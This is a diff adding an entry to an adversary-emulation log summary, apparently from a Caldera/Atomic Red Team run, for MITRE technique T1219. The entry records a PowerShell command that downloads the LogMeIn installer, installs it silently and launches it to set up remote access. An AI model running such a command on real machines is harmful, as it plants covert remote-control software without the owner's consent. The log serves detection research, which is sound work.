@@ -2,6 +2,43 @@
 -->  caldera-techniuqe process and its descendent processes (below)  events-summary (sorted by timestamp) / #events: 2097
 
 
+"atomic__t1219__command-and-control__remote_access_software__f1b3fca18d7465cd10e5a7477a3bf97d__trial_1", # ["LogMeInIgnition.msi","LMIIgnition.exe"]}, // Found "LMIIgnition.exe" in log-entries.
+
+atomic_ordering: ['f1b3fca18d7465cd10e5a7477a3bf97d']
+------------------------------
+{'ability_id': 'f1b3fca18d7465cd10e5a7477a3bf97d',
+ 'agent_reported_time': '2023-11-11T13:10:29Z',
+ 'attack': {'tactic': 'command-and-control',
+            'technique_id': 'T1219',
+            'technique_name': 'Remote Access Software'},
+ 'command': 'Invoke-WebRequest -OutFile '
+            'C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi '
+            'https://secure.logmein.com/LogMeInIgnition.msi; $file1 = '
+            '"C:\\Users\\" + $env:username + "\\Desktop\\LogMeInIgnition.msi"; '
+            "Start-Process -Wait $file1 /quiet; Start-Process 'C:\\Program "
+            'Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe\' "/S"',
+ 'delegated': '2023-12-01T07:09:36Z',
+ 'description': 'An adversary may attempt to trick the user into downloading '
+                'LogMeIn and use to establish C2. Download of LogMeIn '
+                'installer will be at the destination location and ran when '
+                'sucessfully executed.\n',
+ 'executor': 'psh',
+ 'link_id': 'ab229cfb-f861-4b8a-81ef-2e3014cd31d8',
+ 'name': 'LogMeIn Files Detected Test on Windows',
+ 'pid': 380,
+ 'plaintext_command': 'Invoke-WebRequest -OutFile '
+                      'C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi '
+                      'https://secure.logmein.com/LogMeInIgnition.msi; $file1 '
+                      '= "C:\\Users\\" + $env:username + '
+                      '"\\Desktop\\LogMeInIgnition.msi"; Start-Process -Wait '
+                      "$file1 /quiet; Start-Process 'C:\\Program Files "
+                      '(x86)\\LogMeIn Ignition\\LMIIgnition.exe\' "/S"',
+ 'platform': 'windows',
+ 'run': '2023-12-01T07:11:23Z',
+ 'status': 0}
+------------------------------
+
+
 [380, 3868, 5668, 9532]
 ------------------------------------------------------------------
 < splunkd_and_descendent_pids_dict (for reference) -- single-technique process corresponds to the last spawned child of splunkd.exe >:
